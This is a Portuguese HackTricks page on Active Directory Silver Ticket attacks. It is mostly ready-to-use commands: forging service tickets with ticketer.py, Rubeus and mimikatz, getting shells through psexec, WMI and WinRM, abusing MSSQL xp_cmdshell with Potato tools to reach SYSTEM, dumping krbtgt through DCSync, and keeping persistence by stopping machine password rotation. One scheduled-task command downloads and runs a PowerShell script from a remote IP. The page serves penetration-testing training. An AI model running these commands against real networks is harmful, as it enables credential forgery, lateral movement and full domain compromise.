# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

O ataque **Silver Ticket** envolve a exploração de service tickets em ambientes Active Directory (AD). Este método depende de **adquirir o NTLM hash de uma service account**, como uma computer account, para forjar um Ticket Granting Service (TGS) ticket. Com esse ticket forjado, um atacante pode acessar serviços específicos na rede, **se passando por qualquer usuário**, tipicamente visando privilégios administrativos. Enfatiza-se que usar AES keys para forjar tickets é mais seguro e menos detectável.

> [!WARNING]
> Silver Tickets são menos detectáveis do que Golden Tickets porque requerem apenas o **hash da service account**, não a krbtgt account. No entanto, eles são limitados ao serviço específico que atacam. Além disso, apenas roubar a senha de um usuário.
> Além disso, se você comprometer a **senha de uma conta com um SPN** você pode usar essa senha para criar um Silver Ticket passando-se por qualquer usuário para esse serviço.

Para a criação de tickets, diferentes ferramentas são empregadas conforme o sistema operacional:

### No Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### No Windows
```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
O serviço CIFS é destacado como um alvo comum para acessar o sistema de arquivos da vítima, mas outros serviços como HOST e RPCSS também podem ser explorados para tarefas e consultas WMI.

### Exemplo: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Se você tiver o NTLM hash (ou AES key) de uma conta de serviço SQL (por exemplo, sqlsvc) você pode forjar um TGS para o MSSQL SPN e impersonar qualquer usuário perante o serviço SQL. A partir daí, habilite xp_cmdshell para executar comandos como a conta de serviço SQL. Se esse token tiver SeImpersonatePrivilege, você pode encadear um Potato para elevar para SYSTEM.
```bash
# Forge a silver ticket for MSSQLSvc (RC4/NTLM example)
python ticketer.py -nthash <SQLSVC_RC4> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Se o contexto resultante tiver SeImpersonatePrivilege (frequentemente verdadeiro para contas de serviço), use uma variante de Potato para obter SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Mais detalhes sobre abusar do MSSQL e habilitar xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Visão geral das técnicas Potato:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Serviços Disponíveis

| Tipo de Serviço                             | Serviço (Silver Tickets)                                                   |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Dependendo do SO também:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Em algumas ocasiões você pode simplesmente solicitar: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, also psexec            | CIFS                                                                       |
| LDAP operations, included DCSync           | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Usando **Rubeus** você pode **solicitar todos** esses tickets usando o parâmetro:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets - IDs de Evento

- 4624: Logon de Conta
- 4634: Logoff de Conta
- 4672: Logon de Administrador

## Persistência

Para evitar que as máquinas rotacionem sua senha a cada 30 dias, defina `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ou você pode definir `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` para um valor maior que 30 dias para indicar o período de rotação quando a senha da máquina deve ser alterada.

## Abusando de Service tickets

Nos exemplos a seguir, vamos imaginar que o ticket foi obtido impersonando a conta de administrador.

### CIFS

Com este ticket você poderá acessar as pastas `C$` e `ADMIN$` via **SMB** (se estiverem expostas) e copiar arquivos para uma parte do sistema de arquivos remoto fazendo algo como:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Você também poderá obter um shell dentro do host ou executar comandos arbitrários usando **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Com essa permissão você pode criar tarefas agendadas em computadores remotos e executar comandos arbitrários:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Com esses tickets você pode **executar WMI no sistema da vítima**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Encontre **mais informações sobre wmiexec** na seguinte página:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Com acesso winrm a um computador você pode **acessá-lo** e até obter um PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Consulte a página a seguir para aprender **mais maneiras de conectar-se a um host remoto usando winrm**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Observe que **o winrm deve estar ativo e aceitando conexões** no computador remoto para acessá-lo.

### LDAP

Com esse privilégio você pode fazer dump do banco de dados do DC usando **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Saiba mais sobre DCSync** na seguinte página:


{{#ref}}
dcsync.md
{{#endref}}


## Referências

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)



{{#include ../../banners/hacktricks-training.md}}
